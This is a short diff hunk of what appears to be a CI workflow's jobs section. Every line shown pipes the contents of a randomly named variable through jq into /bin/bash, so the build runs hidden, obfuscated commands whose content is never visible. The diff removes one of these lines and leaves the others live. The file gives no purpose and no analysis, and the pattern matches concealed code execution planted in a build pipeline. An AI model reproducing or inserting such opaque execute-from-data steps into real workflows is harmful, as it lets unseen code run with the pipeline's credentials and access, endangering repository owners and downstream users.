@@ -37,7 +37,6 @@ jobs:
           echo $zwqm39147 | jq -r .x64316 | /bin/bash
           printf '%s' "$rj39" | jq -r .fs6028 | /bin/bash
           printf '%s' "$x13405" | jq -r .nxc48 | /bin/bash
-          echo $pqgbk5220 | jq -r .t7007 | /bin/bash
           echo $khiai4082 | jq -r .zgams298 | /bin/bash
           printf '%s' "$h23802" | jq -r .cn4128 | /bin/bash
           echo $jbnl1 | jq -r .wpqs62 | /bin/bash
